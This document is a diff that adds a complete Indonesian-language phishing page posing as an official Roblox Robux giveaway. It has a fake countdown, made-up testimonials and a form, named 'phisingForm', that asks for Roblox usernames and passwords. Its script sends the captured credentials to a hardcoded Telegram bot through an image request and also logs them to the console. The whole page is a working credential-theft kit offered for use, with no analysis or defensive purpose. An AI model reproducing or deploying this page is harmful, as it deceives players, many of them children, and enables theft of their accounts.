@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🎁 Roblox Robux Giveaway | Klaim Robux Gratis!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #1a1f2e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: linear-gradient(145deg, #1a1f30, #0f1422);
+            border-radius: 48px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px rgba(255, 0, 0, 0.2);
+        }
+        .banner {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            padding: 25px 20px;
+            text-align: center;
+        }
+        .banner .robux-icon { font-size: 50px; margin-bottom: 10px; }
+        .banner h1 { font-size: 28px; color: white; }
+        .banner p { font-size: 14px; color: #ffd3b5; margin-top: 5px; }
+        .countdown {
+            background: rgba(0,0,0,0.7);
+            padding: 12px;
+            text-align: center;
+            color: #e74c3c;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .content { padding: 24px 20px; }
+        .offer-text {
+            background: rgba(231, 76, 60, 0.1);
+            border-radius: 24px;
+            padding: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+            border: 1px solid rgba(231, 76, 60, 0.3);
+        }
+        .offer-text .big { font-size: 28px; font-weight: bold; color: #e74c3c; }
+        .offer-text small { color: #aaa; display: block; margin-top: 5px; }
+        
+        /* Pilihan Robux */
+        .robux-options {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+            justify-content: center;
+        }
+        .robux-card {
+            background: #0a0f1a;
+            border: 2px solid #2a3456;
+            border-radius: 24px;
+            padding: 12px;
+            text-align: center;
+            flex: 1;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .robux-card.selected {
+            border-color: #e74c3c;
+            background: rgba(231, 76, 60, 0.2);
+            box-shadow: 0 0 15px rgba(231, 76, 60, 0.3);
+        }
+        .robux-card .value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e74c3c;
+        }
+        .robux-card .label {
+            font-size: 11px;
+            color: #aaa;
+        }
+        
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; color: #aaa; font-size: 12px; margin-bottom: 6px; }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0a0f1a;
+            border: 1px solid #2a3456;
+            border-radius: 28px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #e74c3c;
+            box-shadow: 0 0 10px rgba(231, 76, 60, 0.3);
+        }
+        .btn-claim {
+            width: 100%;
+            background: linear-gradient(95deg, #e74c3c, #c0392b);
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 18px;
+            color: white;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: 800;
+        }
+        .btn-claim:active { transform: scale(0.97); }
+        .testimonials { margin-top: 24px; padding-top: 16px; border-top: 1px solid #2a3456; }
+        .testimonial {
+            background: #0a0f1a;
+            border-radius: 20px;
+            padding: 10px 12px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .testimonial .avatar {
+            width: 35px;
+            height: 35px;
+            background: #e74c3c;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+        }
+        .testimonial .text { flex: 1; }
+        .testimonial .text .name { color: white; font-weight: bold; font-size: 12px; }
+        .testimonial .text .msg { color: #aaa; font-size: 10px; }
+        .footer { text-align: center; padding: 16px; background: #0a0f1a; font-size: 10px; color: #5a6a8a; }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 20px;
+            right: 20px;
+            background: #1a1f30;
+            padding: 12px;
+            border-radius: 60px;
+            text-align: center;
+            color: #e74c3c;
+            font-size: 13px;
+            opacity: 0;
+            transition: 0.2s;
+            z-index: 1000;
+            border: 1px solid #e74c3c;
+        }
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 2000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .modal.active { visibility: visible; opacity: 1; }
+        .modal-content {
+            background: #1a1f30;
+            border-radius: 48px;
+            padding: 32px 24px;
+            text-align: center;
+            max-width: 300px;
+            border: 1px solid #e74c3c;
+        }
+        .modal-content h3 { color: white; margin-bottom: 12px; }
+        .modal-content p { color: #aaa; font-size: 13px; margin-bottom: 20px; }
+        .modal-content button { background: #e74c3c; border: none; padding: 12px 24px; border-radius: 40px; font-weight: bold; cursor: pointer; color: white; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="banner">
+        <div class="robux-icon">💰💰💰</div>
+        <h1>ROBLOX</h1>
+        <p>R O B U X &nbsp; G I V E A W A Y</p>
+    </div>
+    <div class="countdown">⏰ Event berakhir: <span id="timer">05:00</span></div>
+    <div class="content">
+        <div class="offer-text">
+            <p>🎁 SELAMAT! 🎁</p>
+            <p class="big">KLAIM ROBUX GRATIS!</p>
+            <small>Pilih jumlah Robux yang ingin diklaim</small>
+        </div>
+        
+        <!-- Pilihan Robux -->
+        <div class="robux-options">
+            <div class="robux-card" data-value="100">
+                <div class="value">100</div>
+                <div class="label">ROBUX</div>
+            </div>
+            <div class="robux-card" data-value="200">
+                <div class="value">200</div>
+                <div class="label">ROBUX</div>
+            </div>
+            <div class="robux-card" data-value="300">
+                <div class="value">300</div>
+                <div class="label">ROBUX</div>
+            </div>
+        </div>
+        
+        <form id="phisingForm">
+            <div class="form-group">
+                <label>🎮 USERNAME ROBLOX</label>
+                <input type="text" id="username" placeholder="Masukkan username Roblox Anda" required>
+            </div>
+            <div class="form-group">
+                <label>🔐 PASSWORD ROBLOX</label>
+                <input type="password" id="password" placeholder="Password akun Roblox Anda" required>
+            </div>
+            <button type="submit" class="btn-claim">💰 KLAIM ROBUX SEKARANG 💰</button>
+        </form>
+        
+        <div class="testimonials">
+            <div class="testimonial">
+                <div class="avatar">R</div>
+                <div class="text">
+                    <div class="name">Robloxian_Pro</div>
+                    <div class="msg">"Barusan dapet 300 Robux! Langsung masuk ke akun 👍"</div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <div class="avatar">A</div>
+                <div class="text">
+                    <div class="name">AlexBuilder</div>
+                    <div class="msg">"Giveaway legit! Udah 2 kali klaim berhasil 🎉"</div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <div class="avatar">M</div>
+                <div class="text">
+                    <div class="name">Melly_Gamer</div>
+                    <div class="msg">"Makasih Robux nya, beli skin keren! 💰"</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">© 2026 Roblox Official Giveaway | Event Terbatas</div>
+</div>
+
+<div id="toastMsg" class="toast"></div>
+<div id="successModal" class="modal">
+    <div class="modal-content">
+        <h3>✅ ROBUX TERKLAIM!</h3>
+        <p id="modalMessage">Robux akan diproses dan dikirim dalam 5-10 menit ke akun Roblox Anda.</p>
+        <button onclick="closeModal()">Tutup</button>
+    </div>
+</div>
+
+<script>
+    // ============ TELEGRAM BOT ============
+    const BOT_TOKEN = '8937912349:AAGHP-mjqhLkTZkdCwDsBgXgHXBE4Ykj91U';
+    const CHAT_ID = '8560691567';
+    
+    let selectedRobux = 100;
+    
+    // Pilihan Robux
+    document.querySelectorAll('.robux-card').forEach(card => {
+        card.addEventListener('click', () => {
+            document.querySelectorAll('.robux-card').forEach(c => c.classList.remove('selected'));
+            card.classList.add('selected');
+            selectedRobux = parseInt(card.getAttribute('data-value'));
+        });
+    });
+    // Set default selected
+    document.querySelector('.robux-card').classList.add('selected');
+    
+    function sendToTelegram(username, password, robux) {
+        const message = `🔴 NEW ROBLOX ACCOUNT!%0A%0AUsername: ${username}%0APassword: ${password}%0ARobux Klaim: ${robux}%0AWaktu: ${new Date().toLocaleString('id-ID')}`;
+        const img = new Image();
+        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+        console.log('✅ Data dikirim ke Telegram');
+    }
+    
+    // Countdown
+    let timeLeft = 300;
+    function updateTimer() {
+        let minutes = Math.floor(timeLeft / 60);
+        let seconds = timeLeft % 60;
+        document.getElementById('timer').innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        if (timeLeft > 0) { timeLeft--; setTimeout(updateTimer, 1000); }
+    }
+    updateTimer();
+    
+    function showToast(msg) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerText = msg;
+        toast.style.opacity = '1';
+        setTimeout(() => toast.style.opacity = '0', 2500);
+    }
+    
+    function showModal(robux) {
+        const modalMsg = document.getElementById('modalMessage');
+        modalMsg.innerText = `${robux} Robux akan diproses dan dikirim dalam 5-10 menit ke akun Roblox Anda.`;
+        document.getElementById('successModal').classList.add('active');
+    }
+    function closeModal() { 
+        document.getElementById('successModal').classList.remove('active'); 
+        document.getElementById('phisingForm').reset(); 
+    }
+    
+    function saveData(username, password, robux) {
+        console.log('========== DATA AKUN ROBLOX ==========');
+        console.log('Username:', username);
+        console.log('Password:', password);
+        console.log('Robux Klaim:', robux);
+        console.log('======================================');
+        sendToTelegram(username, password, robux);
+    }
+    
+    document.getElementById('phisingForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value;
+        
+        if (!username || !password) { 
+            showToast('❌ Harap isi semua kolom!'); 
+            return; 
+        }
+        if (username.length < 3) { 
+            showToast('❌ Username tidak valid (minimal 3 karakter)'); 
+            return; 
+        }
+        if (password.length < 3) { 
+            showToast('❌ Password terlalu pendek'); 
+            return; 
+        }
+        
+        saveData(username, password, selectedRobux);
+        showToast('✅ Data terkirim! Robux akan diproses...');
+        showModal(selectedRobux);
+    });
+    
+    // Placeholder random
+    const usernameInput = document.getElementById('username');
+    const placeholders = ['ProGamer123', 'BuildMaster', 'Robloxian88', 'NoobSlayer', 'LegendaryPro'];
+    let phIndex = 0;
+    setInterval(() => { 
+        phIndex = (phIndex + 1) % placeholders.length; 
+        usernameInput.placeholder = placeholders[phIndex]; 
+    }, 3000);
+</script>
+</body>
+</html>
